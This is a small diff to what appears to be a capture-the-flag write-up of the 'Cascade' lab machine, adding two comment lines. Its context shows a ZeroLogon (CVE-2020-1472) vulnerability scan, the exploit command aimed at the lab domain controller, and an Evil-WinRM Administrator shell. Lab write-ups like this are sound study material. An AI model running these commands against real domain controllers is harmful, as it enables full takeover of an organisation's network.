@@ -273,6 +273,8 @@ SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson
 ZEROLOGON   10.129.18.9     445    CASC-DC1         VULNERABLE
 ZEROLOGON   10.129.18.9     445    CASC-DC1         Next step: https://github.com/dirkjanm/CVE-2020-1472
 ```
+It is indeed vulnerable
+
 
 ```python
 python3 cve-2020-1472-exploit.py casc-dc1 10.129.18.9 
@@ -384,5 +386,6 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
+Domain admin! AGAIN!
 
 
